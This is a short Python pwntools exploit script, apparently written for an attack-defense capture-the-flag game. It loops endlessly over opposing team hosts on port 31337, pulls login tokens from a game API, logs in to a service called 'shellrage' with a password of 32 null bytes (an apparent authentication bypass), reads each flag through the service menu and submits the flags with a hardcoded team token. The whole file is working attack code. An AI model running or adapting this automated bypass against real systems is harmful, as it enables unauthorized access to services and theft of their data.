from pwn import *
from requests import *

while(True):
    for c in range(8):
        if c != 2:
            try:
                flags = []
                
                for i in range(12):

                    r = remote("10.60." + str(c) + ".1", 31337)

                    id = get("http://10.254.0.1/api/client/attack_data/").json()

                    r.recvuntil(b">> ")

                    r.sendline(b"1")

                    r.recvuntil(b"token:")

                    r.sendline(id["shellrage"]["10.60." + str(c) +".1"][i].encode())

                    r.recvuntil(b"password:")

                    r.sendline(b"\0"*32)

                    r.recvuntil(b">> ")

                    r.sendline(b"1")

                    r.recvuntil(b">> ")

                    r.sendline(b"2")

                    r.recvuntil(b"?")

                    r.sendline(b"1")

                    r.recvline()

                    r.recvline()

                    flags.append(r.recvline().decode()[:-1])

                print(flags)
                r = put("http://10.254.0.1/flags", headers={"X-Team-Token": "fbeb9d1e1e9319f8"}, json=flags)
                r.raise_for_status()
                print(r.text) 
                
            except:
                pass
            


